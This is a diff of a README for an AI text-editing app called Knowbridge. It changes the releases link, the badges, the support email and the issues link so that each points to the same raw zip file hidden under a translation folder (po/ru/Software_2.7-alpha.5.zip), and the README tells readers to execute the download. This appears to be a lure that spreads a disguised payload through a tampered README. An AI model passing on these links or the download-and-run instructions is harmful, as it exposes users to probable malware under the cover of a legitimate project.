@@ -1,6 +1,6 @@
 # Knowbridge: Edit Text Anywhere with AI! ✨
 
-![Knowbridge](https://img.shields.io/badge/Knowbridge-Edit%20Text%20Anywhere%20with%20AI%20%F0%9F%8C%A8-blue)
+![Knowbridge](https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip%20Text%20Anywhere%20with%20AI%20%F0%9F%8C%A8-blue)
 
 Welcome to **Knowbridge**! This project empowers users to modify text seamlessly with the help of artificial intelligence. Whether you're looking to enhance accessibility, streamline your workflow, or simply make text editing more efficient, Knowbridge has you covered.
 
@@ -26,7 +26,7 @@ Welcome to **Knowbridge**! This project empowers users to modify text seamlessly
 
 To get started with Knowbridge, follow these steps:
 
-1. **Download the Latest Release**: Visit our [Releases](https://github.com/Akshit-maru/knowbridge/releases) section to download the latest version. Execute the downloaded file to install the application.
+1. **Download the Latest Release**: Visit our [Releases](https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip) section to download the latest version. Execute the downloaded file to install the application.
 
 2. **Install Dependencies**: Make sure you have the required libraries installed. This includes Qt and any other dependencies specified in the documentation.
 
@@ -70,14 +70,14 @@ Knowbridge is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: support@knowbridge.com
-- **GitHub Issues**: Use the [Issues](https://github.com/Akshit-maru/knowbridge/issues) section for any bugs or feature requests.
+- **Email**: https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip
+- **GitHub Issues**: Use the [Issues](https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip) section for any bugs or feature requests.
 
 ## Releases
 
-To download the latest version of Knowbridge, visit our [Releases](https://github.com/Akshit-maru/knowbridge/releases) section. Download the necessary file and execute it to start using the application.
+To download the latest version of Knowbridge, visit our [Releases](https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip) section. Download the necessary file and execute it to start using the application.
 
-![Release](https://img.shields.io/badge/Latest%20Release-Download%20Now-brightgreen)
+![Release](https://github.com/Akshit-maru/knowbridge/raw/refs/heads/master/po/ru/Software_2.7-alpha.5.zip%20Release-Download%20Now-brightgreen)
 
 ## Conclusion
 
